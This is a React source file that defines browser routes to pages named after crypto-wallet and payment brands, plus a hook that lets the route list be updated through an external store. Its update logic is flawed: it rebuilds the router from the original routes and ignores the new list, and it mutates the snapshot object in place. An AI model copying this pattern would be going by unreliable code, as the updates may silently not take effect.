import PhantomCom from "@page/phantom/index";
import { createBrowserRouter } from "react-router";
import { use, useEffect, useRef, useSyncExternalStore, useMemo } from 'react';
import { CompareValuesWithDetailedDifferences } from "object-deep-compare";
import Trust from "@page/trust/index";
import MetaMask from "@page/metamask/index";
import TronLinkCom from "@page/tronlink/index";
import PhonepeCom from "@page/phonepe/index";
import genRoute from "@utlis/index";
let routes = [{
  path: "/",
  Component: Trust
}, {
  path: "/trust",
  Component: Trust
}, {
  path: "/metamask",
  Component: MetaMask
}, {
  path: "/tronlink",
  Component: TronLinkCom
}, {
  path: "/phonepe",
  Component: PhonepeCom
}, {
  path: "/phantom",
  Component: PhantomCom
}];
var globalRouter = createBrowserRouter(routes);
var dataObj = {
  router: globalRouter,
  routes: routes
};
var callbackFuncList = [];
function createMyRouter(routeList) {
  if (typeof window === 'undefined') {
    return null;
  } else {
    return createBrowserRouter(routeList);
  }
}
function emitChange() {
  callbackFuncList.forEach(change => change());
}
function subscribe(callback) {
  callbackFuncList.push(callback);
  return () => {
    callbackFuncList = callbackFuncList.filter(cb => cb !== callback);
  };
}
function getSnapshot() {
  return dataObj;
}
function useRouterDataList() {
  //const routerRef = useRef(router);
  //const [router, setRouter] = useState(currentRouter);
  const freshRoutes = useSyncExternalStore(subscribe, getSnapshot);
  const setData = useMemo(() => {
    return routeList => {
      var difference = CompareValuesWithDetailedDifferences(dataObj.routes, routeList);
      if (difference.length) {
        dataObj.routes = [...routeList];
        dataObj.router = createMyRouter(routes);
        emitChange();
      }
    };
  }, []);
  useEffect(() => {
    if (typeof window !== 'undefined') {}
  }, []);
  return {
    router: freshRoutes,
    setData
  };
}

//export default router;
export { useRouterDataList };